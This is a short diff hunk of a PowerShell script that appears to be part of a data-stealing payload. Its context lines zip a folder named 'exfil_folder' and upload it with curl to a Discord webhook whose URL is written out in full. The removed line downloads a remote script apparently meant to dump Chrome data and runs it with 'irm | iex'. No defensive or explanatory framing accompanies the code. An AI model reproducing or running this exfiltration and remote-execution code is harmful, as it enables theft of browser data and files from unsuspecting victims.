@@ -13,4 +13,3 @@ compress-archive -path "$exfil_folder" -destinationpath "$exfil_folder.zip" -for
 $webhookUrl = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC"  # Replace with your Discord webhook URL
 
 curl.exe -k -X POST -F 'payload_json={\"username\": \"BinBot\", \"content\": \"\", \"avatar_url\": \"https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif\"}' -F "file=@$env:temp\B1555.005.zip" $webhookUrl
-powershell irm https://raw.githubusercontent.com/bindas88/usbcrime/main/Chrome80Dp.ps1 | iex
